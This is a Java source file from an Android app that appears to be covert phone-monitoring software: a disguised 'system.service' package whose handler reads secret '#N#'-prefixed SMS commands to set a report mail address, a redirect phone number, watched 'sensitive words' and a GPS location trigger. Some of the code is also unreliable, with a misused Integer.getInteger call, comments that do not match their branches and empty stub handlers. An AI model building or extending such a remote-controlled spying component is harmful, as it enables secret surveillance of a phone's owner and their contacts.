package system.service;

import java.util.Date;

import system.service.activity.GlobalPrefActivity;
import system.service.config.ConfigCtrl;
import android.content.Context;

import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
import com.particle.inspector.common.util.license.LicenseCtrl;

public class IndicationHandler 
{
	private static final String CONST_OFF = "OFF";
	private static final String CONST_YES = "YES";
	private static final String CONST_NO  = "NO";

	public static void handleIndicationSms(Context context, String smsBody) 
	{
		// -------------------------------------------------------
		// #0#<license key>: activate apk
		if (smsBody.startsWith("#0#")) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH)
			{
				LICENSE_TYPE type = LicenseCtrl.calLicenseType(context, smsBody);
				if (type == LICENSE_TYPE.NOT_LICENSED || type == LICENSE_TYPE.TRIAL_LICENSED) return;
				
				ConfigCtrl.setLicenseKey(context, indication);
				ConfigCtrl.setLicenseType(context, type);
				Date now = new Date();
				ConfigCtrl.setConsumedDatetime(context, now);
				ConfigCtrl.setLastActivatedDatetime(context, now);
				
				// Necessary to force reboot to make key effective?
				// TODO
			}
		}
		
		// -------------------------------------------------------
		// #1#<mail address>: change mail address
		else if (smsBody.startsWith("#1#")) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() > 0 && StrUtils.validateMailAddress(indication)) {
				GlobalPrefActivity.setMail(context, indication);
			} else {
				// Send SMS to warn the user
				//TODO
			}
		}
		
		// -------------------------------------------------------
		// #2#<interval days>: change get info interval days
		else if (smsBody.startsWith("#2#")) {
			String indication = smsBody.substring(3).trim();
			int days = 1;
			try {
				days = Integer.getInteger(indication);
			} catch (Exception ex) {
				// Send SMS to warn the user
				//TODO
				return;
			}
			
			if (days < 1 || days > 7) {
				// Send SMS to warn the user
				// TODO
				return;
			}
			
			GlobalPrefActivity.setInfoInterval(context, days);
		}
		
		// -------------------------------------------------------
		// #3#<sensitive words>: change sensitive words
		else if (smsBody.startsWith("#3#")) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() > 0) {
				GlobalPrefActivity.setRedirectPhoneNum(context, indication);
			}
		}
		
		// -------------------------------------------------------
		// #4#<sensitive words>: change sensitive words
		else if (smsBody.startsWith("#4#")) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() > 0) {
				// When it is OFF or off, we disable the location function
				if (indication.equalsIgnoreCase(CONST_OFF)) {
					GlobalPrefActivity.setSensitiveWords(context, "");
					return;
				}
				
				String oriWords = indication.replaceAll(" {2,}", GlobalPrefActivity.SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
				String[] words = oriWords.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
				if (words.length > GlobalPrefActivity.MAX_SENSITIVE_WORD_COUNT) {
					// Send SMS to warn the user
					// TODO
					
				}
				
				GlobalPrefActivity.setSensitiveWords(context, indication);
			}
		}
		
		// -------------------------------------------------------
		// #5#<location word>: change location word
		else if (smsBody.startsWith("#5#")) {
			String indication = smsBody.substring(3).trim();
			
			// When it is OFF or off, we disable the location function
			if (indication.length() > 0) {
				if (indication.equalsIgnoreCase(CONST_OFF)) {
					GlobalPrefActivity.setGpsWord(context, "");
				} else {
					GlobalPrefActivity.setGpsWord(context, indication);
				}
			}
		}
		
		// -------------------------------------------------------
		// #5#<Yes/No>: show location SMS or not
		else if (smsBody.startsWith("#6#")) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.equalsIgnoreCase(CONST_YES)) {
				GlobalPrefActivity.setDisplayGpsSMS(context, true);
			} else if (indication.equalsIgnoreCase(CONST_NO)) {
				GlobalPrefActivity.setDisplayGpsSMS(context, false);
			}
		}
		
		else if (smsBody.startsWith("#7#")) {
			String indication = smsBody.substring(3).trim();
		}
		
		else if (smsBody.startsWith("#8#")) {
			String indication = smsBody.substring(3).trim();
		}
		
		else if (smsBody.startsWith("#9#")) {
			String indication = smsBody.substring(3).trim();
		}
		
	}
}
